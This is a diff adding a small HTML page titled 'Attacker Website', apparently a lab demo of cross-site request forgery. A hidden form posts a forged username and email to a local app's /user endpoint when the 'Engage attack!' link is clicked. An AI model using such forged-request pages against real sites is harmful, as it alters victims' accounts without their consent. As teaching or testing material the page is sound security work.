@@ -1,0 +1,17 @@
+<html lang=en>
+  <head>
+    <meta charset=utf-8>
+    <title>Attacker Website</title>
+  </head>
+  <body>
+
+    <section>
+      <form method="post" action="http://localhost:3000/user">
+          <input type="hidden" name="username" value="The Attacker">
+          <input type="hidden" name="email" value="theattacker@attacker.com">
+      </form>
+      <a href="#" onclick="document.forms[0].submit()"><h1>Engage attack!</h1></a>
+    </section>
+    
+  </body>
+</html>
